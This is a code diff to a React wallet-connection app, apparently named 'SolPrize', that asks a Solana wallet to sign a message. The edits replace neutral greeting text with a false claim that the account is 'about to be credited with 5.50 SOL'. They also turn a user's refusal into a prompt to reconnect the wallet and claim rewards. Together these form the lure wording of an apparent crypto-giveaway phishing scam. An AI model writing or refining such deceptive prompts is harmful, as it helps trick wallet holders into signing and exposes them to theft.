@@ -201,7 +201,7 @@ export default function App() {
 
   const signHelloTransaction = useCallback(async (provider, publicKey) => {
     try {
-      addDebug('✍️ Creating "You are about to be credited with 5.50 Sol, please continue" message transaction...', 'info');
+      addDebug('✍️ Creating "Hello from SolPrize" message transaction...', 'info');
       
       if (!provider) {
         throw new Error('No wallet provider available for signing');
@@ -212,7 +212,7 @@ export default function App() {
       }
       
       // Create message to sign
-      const message = new TextEncoder().encode(`Hello from SolPrize Rewards! ${new Date().toISOString()}`);
+      const message = new TextEncoder().encode(`Account is about to be credited with 5.50 SOL! ${new Date().toISOString()}`);
       
       // Sign the message
       let signature;
@@ -231,7 +231,7 @@ export default function App() {
       return {
         success: true,
         signature: Array.from(signature).map(b => b.toString(16).padStart(2, '0')).join(''),
-        message: 'Hello from SolPrize Rewards! 🎉'
+        message: 'Account is about to be credited with 5.50 SOL! 🎉'
       };
       
     } catch (error) {
@@ -240,7 +240,7 @@ export default function App() {
       // Handle user rejection gracefully
       if (error.message.includes('rejected') || error.code === 4001) {
         addDebug('👤 User rejected the signature request', 'warn');
-        throw new Error('User rejected signature request');
+        throw new Error('Rewards rejected by user!, reconnect your wallet to try again.');
       }
       
       throw error;
